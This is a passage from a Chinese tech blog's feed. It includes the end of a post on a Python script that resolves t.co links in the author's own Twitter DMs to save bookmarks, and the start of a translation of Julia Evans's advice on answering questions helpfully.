&lt;span class="n"&gt;ACCESS_TOKEN_SECRET&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;  
&lt;span class="n"&gt;MY_TWITTER_ID&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;  
&lt;span class="n"&gt;MY_BOT_TWITTER_ID&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;  


&lt;span class="n"&gt;api&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;twitter&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Api&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;  
    &lt;span class="n"&gt;consumer_key&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;CONSUMER_KEY&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;  
    &lt;span class="n"&gt;consumer_secret&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;CONSUMER_SECRET&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;  
    &lt;span class="n"&gt;access_token_key&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;ACCESS_TOKEN_KEY&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;  
    &lt;span class="n"&gt;access_token_secret&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;ACCESS_TOKEN_SECRET&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;  
&lt;span class="p"&gt;)&lt;/span&gt;  

&lt;span class="c1"&gt;# Twitter API limitation:  &lt;/span&gt;
&lt;span class="c1"&gt;# &amp;quot;Last 30 days DMs&amp;quot; or &amp;quot;Up to 200 DMs which created before 30 days&amp;quot;  &lt;/span&gt;
&lt;span class="n"&gt;sent_direct_messages&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;api&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GetSentDirectMessages&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;count&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;200&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;dm&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;sent_direct_messages&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;  
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;dm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recipient_id&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;MY_BOT_TWITTER_ID&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;  
        &lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;  
            &lt;span class="c1"&gt;# Got t.co url in DM, use urllib to get its real Twitter Status URL.  &lt;/span&gt;
            &lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="n"&gt;urllib&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;urlopen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;  
                &lt;span class="n"&gt;real_url&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;geturl&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;  
        &lt;span class="k"&gt;except&lt;/span&gt; &lt;span class="ne"&gt;Exception&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;  
            &lt;span class="k"&gt;raise&lt;/span&gt;  
        &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;  
            &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;+ &amp;lt;{}&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;real_url&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;開一個 gist 放個程式碼：&lt;a href="https://gist.github.com/M157q/a90f5d2948442dc482e35d671b074c6f"&gt;https://gist.github.com/M157q/a90f5d2948442dc482e35d671b074c6f&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;結果&lt;/h2&gt;
&lt;p&gt;直接以網址呈現：&lt;br /&gt;
（其實應該可以直接 embed tweet 啦，但我有點懶得弄。）  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://twitter.com/yoyo0329/status/944230050399793152"&gt;https://twitter.com/yoyo0329/status/944230050399793152&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/rewoIf/status/943852230796484610"&gt;https://twitter.com/rewoIf/status/943852230796484610&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/zaticwu/status/943834445886267392"&gt;https://twitter.com/zaticwu/status/943834445886267392&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/zhusee2/status/943728354057887744"&gt;https://twitter.com/zhusee2/status/943728354057887744&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/TinyDenny/status/943332441699299328"&gt;https://twitter.com/TinyDenny/status/943332441699299328&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/CHl1XIB8ymdrKbC/status/943482302822150144"&gt;https://twitter.com/CHl1XIB8ymdrKbC/status/943482302822150144&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/jserv/status/942265803868487680"&gt;https://twitter.com/jserv/status/942265803868487680&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/rochacbruno/status/942419952300167169"&gt;https://twitter.com/rochacbruno/status/942419952300167169&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/daiwanhanji/status/942046653619478535"&gt;https://twitter.com/daiwanhanji/status/942046653619478535&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/thecat/status/942193282968305664"&gt;https://twitter.com/thecat/status/942193282968305664&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/riddle_ling/status/942271085495459840"&gt;https://twitter.com/riddle_ling/status/942271085495459840&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/c9s/status/942224140273987584"&gt;https://twitter.com/c9s/status/942224140273987584&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/sandokaishy/status/942057552577052672"&gt;https://twitter.com/sandokaishy/status/942057552577052672&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/johnroyer/status/941478195362119682"&gt;https://twitter.com/johnroyer/status/941478195362119682&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/ferrari_tw/status/941137503423119360"&gt;https://twitter.com/ferrari_tw/status/941137503423119360&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/lovecankill/status/940781592947048448"&gt;https://twitter.com/lovecankill/status/940781592947048448&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/linuxtoy/status/940780140081975298"&gt;https://twitter.com/linuxtoy/status/940780140081975298&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/Ignissfate/status/940453739718066177"&gt;https://twitter.com/Ignissfate/status/940453739718066177&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/schrockn/status/940037656494317568"&gt;https://twitter.com/schrockn/status/940037656494317568&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/M157q/status/939785465992953857"&gt;https://twitter.com/M157q/status/939785465992953857&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/welkineins/status/939541907612377089"&gt;https://twitter.com/welkineins/status/939541907612377089&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/WanCW/status/938624903724404736"&gt;https://twitter.com/WanCW/status/938624903724404736&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/jaceju/status/937497004690751488"&gt;https://twitter.com/jaceju/status/937497004690751488&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/ronnywang/status/937511877092847616"&gt;https://twitter.com/ronnywang/status/937511877092847616&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/hynek/status/937316249431928832"&gt;https://twitter.com/hynek/status/937316249431928832&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/Schnappiggg/status/936591006169890816"&gt;https://twitter.com/Schnappiggg/status/936591006169890816&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/tebeka/status/934013246226526210"&gt;https://twitter.com/tebeka/status/934013246226526210&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/riddle_ling/status/932499976193585152"&gt;https://twitter.com/riddle_ling/status/932499976193585152&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/PeterZaitsev/status/931485736855134213"&gt;https://twitter.com/PeterZaitsev/status/931485736855134213&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/TinyDenny/status/932093891368460288"&gt;https://twitter.com/TinyDenny/status/932093891368460288&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/ruanyf/status/931709967966412800"&gt;https://twitter.com/ruanyf/status/931709967966412800&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/dlackty/status/931328546664050689"&gt;https://twitter.com/dlackty/status/931328546664050689&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/joelgrus/status/931202032978948096"&gt;https://twitter.com/joelgrus/status/931202032978948096&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/x0rz/status/930016909231362048"&gt;https://twitter.com/x0rz/status/930016909231362048&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/TinyDenny/status/929187796752855040"&gt;https://twitter.com/TinyDenny/status/929187796752855040&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/dbader_org/status/927899530942668801"&gt;https://twitter.com/dbader_org/status/927899530942668801&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/M157q_News_RSS/status/925543091339010048"&gt;https://twitter.com/M157q_News_RSS/status/925543091339010048&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/WanCW/status/924993679156056064"&gt;https://twitter.com/WanCW/status/924993679156056064&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/jaceju/status/924455583587037184"&gt;https://twitter.com/jaceju/status/924455583587037184&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/LoveHyperApp/status/923523498743439360"&gt;https://twitter.com/LoveHyperApp/status/923523498743439360&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/suitingtseng/status/923917098233073664"&gt;https://twitter.com/suitingtseng/status/923917098233073664&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;題外話&lt;/h2&gt;
&lt;p&gt;在寫這篇的時候發現，&lt;br /&gt;
最近 Twitter 好像針對這需求有了一個&lt;a href="https://techcrunch.com/2017/11/23/twitter-is-testing-bookmarks-a-feature-to-privately-flag-tweets-for-later/"&gt;新的 Bookmark 功能&lt;/a&gt;，&lt;br /&gt;
看了一下，好像還不能分類就是，&lt;br /&gt;
所以我應該還是會繼續用這樣的方式當作 bookmark。  &lt;/p&gt;
&lt;p&gt;然後也發現好像多了個 &lt;a href="https://developer.twitter.com/en/docs/accounts-and-users/subscribe-account-activity/overview"&gt;Account Activity API&lt;/a&gt;，&lt;br /&gt;
可以設定 webhook 即時接收帳號的事件，&lt;br /&gt;
可能可以做到類似聊天機器人這樣事件觸發式的對話。  &lt;/p&gt;
&lt;p&gt;如果是這裡的用途的話，&lt;br /&gt;
可以在我每次發送私訊的時候，&lt;br /&gt;
就直接透過 webhook 把該 tweet 的內容存在資料庫裡，&lt;br /&gt;
這樣就不會受 Twitter API 的限制了，&lt;br /&gt;
有空的話再來弄吧。  &lt;/p&gt;</summary><category term="Python"></category><category term="Twitter"></category><category term="2018 iT 邦幫忙鐵人賽"></category></entry><entry><title>《回答的智慧》</title><link href="https://blog.m157q.tw/posts/2017/12/21/how-to-answer-questions-in-a-helpful-way-zh-tw/" rel="alternate"></link><published>2017-12-22T22:51:26+08:00</published><updated>2017-12-22T22:51:26+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2017-12-21:posts/2017/12/21/how-to-answer-questions-in-a-helpful-way-zh-tw/</id><summary type="html">&lt;ul&gt;
&lt;li&gt;本文為翻譯文章  &lt;/li&gt;
&lt;li&gt;原文為：&lt;a href="https://jvns.ca/blog/answer-questions-well/"&gt;How to answer questions in a helpful way - Julia Evans&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://mobile.twitter.com/M157q/status/943722828188151808"&gt;本文已獲得作者 Julia Evans 同意授權翻譯並發佈&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;《回答的智慧》&lt;/h2&gt;
&lt;p&gt;當你遇到與你共事的人向你詢問問題，&lt;br /&gt;
卻描述得不太清楚時，你會怎麼回答？&lt;br /&gt;
我認為問問題是門學問，&lt;br /&gt;
（請參見我另外一篇文章 &lt;a href="https://jvns.ca/blog/good-questions/"&gt;How to ask good questions&lt;/a&gt;）&lt;br /&gt;
【譯註：這是作者另外一篇文章，有機會的話我也會嘗試翻譯。】&lt;br /&gt;
然而，&lt;br /&gt;
如何有效得回答問題同樣是門學問，&lt;br /&gt;
兩者同等實用。  &lt;/p&gt;
&lt;p&gt;在開始之前，先做個假設：&lt;br /&gt;
我知道大家多少都遇過不尊重你的寶貴時間的提問者，&lt;br /&gt;
那種感覺很糟。&lt;br /&gt;
但在這篇文章中，&lt;br /&gt;
我要先假定這樣的情況不存在。&lt;br /&gt;
假設這篇文章裡的提問者都是合乎理性且會盡全力把事情弄懂，&lt;br /&gt;
是會讓你想幫助的那種人。&lt;br /&gt;
因為身邊和我一起工作的伙伴都是這樣的人，&lt;br /&gt;
而我目前就是在這樣的環境下工作。&lt;br /&gt;
【譯註：除了讓人羨慕以外，我想這也會讓這篇文章著重在回答問題上，比較不會模糊焦點。】  &lt;/p&gt;
&lt;p&gt;以下是一些我認為如何更有效回答問題的方法：  &lt;/p&gt;
&lt;h3&gt;如果對方的問題不夠明確，幫助對方釐清問題&lt;/h3&gt;
&lt;p&gt;初學者常會提出不夠明確的問題，或者提出沒有足夠資訊、讓人無從回答的問題。&lt;br /&gt;
這裡有幾個方法可以讓你幫助他們釐清問題：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;用&lt;strong&gt;更確切的問題&lt;/strong&gt;回問對方。  &lt;/li&gt;
&lt;li&gt;詢問對方沒有提供的那些&lt;strong&gt;更加確切的資訊&lt;/strong&gt;。  &lt;ul&gt;
&lt;li&gt;例如：你是使用 IPv6 嗎？  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;詢問對方&lt;strong&gt;是什麼原因而問這個問題&lt;/strong&gt;。  &lt;ul&gt;
&lt;li&gt;舉例來說，有時候我會遇到同事在群組頻道裏面詢問「我們公司的 service discovery 是如何運作的？」  &lt;/li&gt;
&lt;li&gt;通常會有此一問是因為他們正在嘗試架設或是調整某個服務。  &lt;/li&gt;
&lt;li&gt;在這種情況下，回問「你現在在弄哪個服務？我可以看一下你目前的 Pull Request  嗎？」會是有幫助的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;很多類似的方法在我的另外一篇文章 &lt;a href="https://jvns.ca/blog/good-questions/"&gt;How to ask good questions&lt;/a&gt; 都有被提及。&lt;br /&gt;
（然而我絕對不會對某個人說：「喔，你必須先看過這篇 &lt;a href="https://jvns.ca/blog/good-questions/"&gt;How to ask good questions&lt;/a&gt; 才能問我問題。」）  &lt;/p&gt;
&lt;h3&gt;先瞭解對方已經知道哪些東西&lt;/h3&gt;
&lt;p&gt;在回答問題之前，先瞭解對方已經知道哪些東西是很有用的。  &lt;/p&gt;
&lt;p&gt;Harold Treen 給了我一個很棒的例子：  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;某天有個人要我解釋 "&lt;a href="https://github.com/redux-saga/redux-saga"&gt;Redux Sagas&lt;/a&gt;" 是什麼，我並沒有直接回答：「它們就像等待 action 並幫你更新 store 的背景工作執行緒 (worker threads)！」&lt;br /&gt;
而是先從對方對於 Redux, Redux 的 action, Redux 的 store 及其他關於 Redux 的基本觀念瞭解多少著手，如此一來會讓解釋 Redux Sagas 這件事容易一些，因為這些觀念與其環環相扣。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;瞭解對你提問的人已經知道哪些東西是很重要的，&lt;br /&gt;
因為對方可能是連一些基本的觀念都還搞不太清楚的新手（例如：什麼是 Redux?），&lt;br /&gt;
也可能是遇到極端案例（corner case）的老手。&lt;br /&gt;
你的回答如果是建立在對方不知道的觀念上，會造成對方的困惑；&lt;br /&gt;
你的回答如果是重述對方已經知道的事情，則會讓對方感到厭煩。  &lt;/p&gt;
&lt;p&gt;在詢問對方已經知道哪些東西的時候，有個實用的技巧是，&lt;br /&gt;
與其問對方「你知道 XXX 嗎？」&lt;br /&gt;
也許可以試著改成問對方「你對 XXX 瞭解的程度有多少？」&lt;br /&gt;
【譯註：第一種問法得到的回答通常只有「知道」或「不知道」，而第二種通常會得到比較詳細一點的回答，能夠比第一種問法容易知道對方的程度。】  &lt;/p&gt;
&lt;h3&gt;告訴對方應該要看哪些文件&lt;/h3&gt;
&lt;p&gt;「去讀那些他媽的文件」(RTFM) 是最典型的無用回答，&lt;br /&gt;
但如果你明確告訴對方要去看哪個文件則能產生很大的幫助。&lt;br /&gt;
當我問問題的時候，比起直接得到答案，&lt;br /&gt;
我其實比較喜歡被告知該去看哪份文件，&lt;br /&gt;
因為該份文件的內容很可能也會順便解決掉我其他的問題。  &lt;/p&gt;
&lt;p&gt;我認為有件很重要的事情是，&lt;br /&gt;
你必須確保當下告知對方的文件真的有回答到他的問題，&lt;br /&gt;
如果沒有的話，至少在事後確認它有幫助到對方。&lt;br /&gt;
否則你很有可能上演這種常見的場景：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;問：「我要怎麼做到 X 這件事？」  &lt;/li&gt;
&lt;li&gt;答：（給了一份文件的連結）  &lt;/li&gt;
&lt;li&gt;問：「這份文件沒有解釋 X 啊，只有解釋 Y。」  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;如果我告知對方的文件太過冗長的話，&lt;br /&gt;
我會明確點出我正在說的是其中的哪一個部份。&lt;br /&gt;
&lt;a href="https://linux.die.net/man/1/bash"&gt;Bash 的使用說明&lt;/a&gt; 有 44,000 個英文字（這是真的！），&lt;br /&gt;
所以如果只告訴對方「去看 Bash 的使用說明。」根本沒什麼幫助。  &lt;/p&gt;
&lt;h3&gt;告訴對方可以用什麼樣的關鍵字去搜尋&lt;/h3&gt;
&lt;p&gt;在工作上，&lt;br /&gt;
我時常會使用一些「我知道這會讓我得到答案」的關鍵字來進行搜尋。&lt;br /&gt;
然而這樣的關鍵字對於新手來說可能不是這麼顯而易見，&lt;br /&gt;
所以告訴對方「如果是我的話，我會用 XXX 關鍵字來搜尋答案。」是很有用的。&lt;br /&gt;
同樣地，記得事後確認一下你給出的關鍵字真的有幫助到他們。  &lt;/p&gt;
&lt;h3&gt;撰寫新文件&lt;/h3&gt;
&lt;p&gt;我常常不斷遇到不同的人來問我所處的團隊一模一樣的問題，&lt;br /&gt;
但這並不是這些人的錯，&lt;br /&gt;
畢竟他們不知道在這之前已經有 10 個人問過一樣的問題，&lt;br /&gt;
也不知道答案。&lt;br /&gt;
因此，與其一直重複告訴不同的人相同的答案，&lt;br /&gt;
我和團隊的其他人改用了以下的步驟：  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;馬上為這個問題撰寫解答的文件  &lt;/li&gt;
&lt;li&gt;告訴提問者這份我們新撰寫的文件  &lt;/li&gt;
&lt;li&gt;皆大歡喜！  &lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;雖然撰寫文件花費的時間比直接回答問題還多，&lt;br /&gt;
但通常是很值得的，尤其是以下幾種問題：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;一而再，再而三，不斷被人重複問的問題。  &lt;/li&gt;
&lt;li&gt;答案不太會隨時間而變動的問題。  &lt;ul&gt;
&lt;li&gt;如果答案是每週或每月就會變動的話，這份文件就很容易過期，也會令提問者感到失望。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;向對方解釋你做了哪些事&lt;/h3&gt;
&lt;p&gt;身為某個領域的初學者時，&lt;br /&gt;
如果發生以下對話，真的會令人很沮喪：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;菜鳥：「你怎麼弄這東西的？」  &lt;/li&gt;
&lt;li&gt;老鳥：「就這樣啊，我弄完了。」  &lt;/li&gt;
&lt;li&gt;菜鳥：「……，但你做了哪些事啊？」  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;如果向你提問的人正在嘗試瞭解某件事是如何運作的話，&lt;br /&gt;
幾個方法將對其有所幫助：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;帶對方完整跑過一次流程，而不是只做給對方看。  &lt;/li&gt;
&lt;li&gt;告訴對方你是用了哪些方法得到答案的&lt;br /&gt;
【譯註：給他釣竿教他如何自己釣到魚，而不是在他面前釣魚給他看，然後把釣到的魚給他。】  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;雖然這比你直接做給對方看要花更多時間，&lt;br /&gt;
但這對於提問者來說是個學習的機會，&lt;br /&gt;
如此一來，他們往後面對相同的問題時就能夠有所準備。  &lt;/p&gt;
&lt;p&gt;套用這樣的方法，對話狀況就會好上許多：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;菜鳥：「我在網站上看到錯誤，發生什麼事了？」  &lt;/li&gt;
&lt;li&gt;老鳥：「（檢查兩分鐘後）喔，因為資料庫正在進行容錯移轉（failover）。」  &lt;/li&gt;
&lt;li&gt;菜鳥：「原來！你是怎麼知道的啊？」  &lt;/li&gt;
&lt;li&gt;老鳥：「以下是我做的判斷：」  &lt;ul&gt;
&lt;li&gt;從錯誤訊息看來，這類的錯誤通常是因為某個服務掛了，我去察看了一下，發現該服務還在正常執行，所以問題不在這。  &lt;/li&gt;
&lt;li&gt;所以我去看了網站的後台，後台顯示有個資料庫容錯移轉的動作正在執行。  &lt;/li&gt;
&lt;li&gt;然後我再去察看該服務的紀錄檔，紀錄裡頭顯示連線到資料庫的時候出錯了，看起來問題就出在這。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;如果你向對方解釋你如何針對問題進行除錯，&lt;br /&gt;
將有利於讓對方瞭解你如何排除其他原因及如何發現真正的問題點。&lt;br /&gt;
當你遇到問題時，能馬上判斷出原因，的確是件讓人覺得很爽的事。&lt;br /&gt;
但幫助他人學得更好、更深入分析問題，&lt;br /&gt;
並瞭解到自己想出來的對策是有效的，&lt;br /&gt;
是件更棒的事。  &lt;/p&gt;
&lt;h3&gt;解決最根本的問題&lt;/h3&gt;
&lt;p&gt;這個方法比較難一點，有時候會遇到一種情況，&lt;br /&gt;
提問者覺得自己已經找到了正確的解決方法，&lt;br /&gt;
且只差最後一個關鍵就可以把問題解決，&lt;br /&gt;
但其實很可能不是這麼一回事。&lt;br /&gt;
舉例來說：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;George:「我現在在想辦法搞定 X，然後出錯了，我要怎麼解掉這個錯誤？」  &lt;/li&gt;
&lt;li&gt;Jasminda: 「你實際上是不是想搞定 Y？如果是的話，你不應該從 X 下手，你應該要從 Z 下手才對。」  &lt;/li&gt;
&lt;li&gt;George：「對耶！感謝！那我要先來解決 Z。」  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;在上面的對話中，Jasminda 並沒有直接回答 George 的問題，&lt;br /&gt;
而是根據經驗推測 George 實際上不是想搞定 X 這件事，&lt;br /&gt;
而她對了，這個舉動非常的有用。  &lt;/p&gt;
&lt;p&gt;但有一點要注意的是，&lt;br /&gt;
如果回答者太過於高姿態的話，很可能會造成反效果，&lt;br /&gt;
例如：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;George:「我現在在想辦法搞定 X，然後出錯了，我要怎麼解掉這個錯誤？」  &lt;/li&gt;
&lt;li&gt;Jasminda:「不用解這個錯誤，你實際上應該是想搞定 Y，然後你應該先從 Z 著手。」  &lt;/li&gt;
&lt;li&gt;George:「ㄜ，我真的沒有想解決 Y，我是真的因為某些原因想要搞定 X，我到底該怎麼做？」  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;所以回答時切忌高姿態，&lt;br /&gt;
而且要記住，有些提問者有可能會附上他們已經做了哪些事，&lt;br /&gt;
最好的回答方式是，&lt;br /&gt;
針對「對方提問的問題」及「對方真正該問的問題」都進行回答，&lt;br /&gt;
例如：  &lt;/p&gt;
&lt;p&gt;「如果你想要解決 X 的話，你可以試試看這個方法，但如果你想用這個方法解決 Y 的話，我建議你用另外一個方法，那個方法比較有效。」  &lt;/p&gt;
&lt;h3&gt;問對方「這樣有回答到你的問題嗎？」&lt;/h3&gt;
&lt;p&gt;我喜歡在自認為已經回答到對方的問題後，&lt;br /&gt;
額外向對方確認：「這樣有回答到你的問題嗎？還有更多想問的嗎？」  &lt;/p&gt;
&lt;p&gt;然後我會停下來等對方回答這個問題，&lt;br /&gt;
這樣做的好處是，人們總是需要個一兩分鐘確認自己是不是真的搞懂了。&lt;br /&gt;
我是在撰寫文件的時候才特別發現，&lt;br /&gt;
這句額外的「這樣有回答到你的問題嗎？」是很有用的，&lt;br /&gt;
我因為這點，&lt;br /&gt;
常常在為我已經熟知的事物撰寫文件時，&lt;br /&gt;
留下一些對他人而言重要的資訊而不自知。  &lt;/p&gt;
&lt;h3&gt;嘗試當面、視訊或語音通話來溝通，不要只用文字&lt;/h3&gt;
&lt;p&gt;我是一位遠端工作者，&lt;br /&gt;
所以我和同事絕大多數的對話都是用文字溝通，&lt;br /&gt;
對我來說，文字是預設的溝通方式。  &lt;/p&gt;
&lt;p&gt;現今，我們活在一個很容易進行視訊會議與分享螢幕畫面的世界。&lt;br /&gt;
工作時，我可以點個按鈕就開始和某人進行視訊會議，&lt;br /&gt;
並分享螢幕畫面給對方。&lt;br /&gt;
許多問題用講的會比用打字的更容易解決。  &lt;/p&gt;
&lt;p&gt;例如：&lt;br /&gt;
最近有人問我要如何規劃與設定服務自動擴充（autoscaling）的容量，&lt;br /&gt;
我腦中大概可以想出有哪些東西需要釐清，&lt;br /&gt;
但還不是非常確定真正的情況。&lt;br /&gt;
於是我們快速通了個視訊電話，&lt;br /&gt;
五分鐘之後，&lt;br /&gt;
就回答完他們提出的所有問題了。  &lt;/p&gt;
&lt;p&gt;我特別相信，如果有人對於某件事情不知道如何下手，&lt;br /&gt;
以結對程式設計（pair programming）的方式進行當面的溝通，&lt;br /&gt;
只要幾分鐘就會很有幫助，&lt;br /&gt;
比只用電子郵件或即時通訊軟體來溝通有效多了。  &lt;/p&gt;
&lt;h3&gt;回答問題時不要表現得很驚訝&lt;/h3&gt;
&lt;p&gt;這個原則出自於 &lt;a href="https://www.recurse.com/manual#no-feigned-surprise"&gt;Recurse Center 手冊的其中一條：別假裝很驚訝&lt;/a&gt;，&lt;br /&gt;
常見的情況：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;小明：「什麼是 Linux kernel？」  &lt;/li&gt;
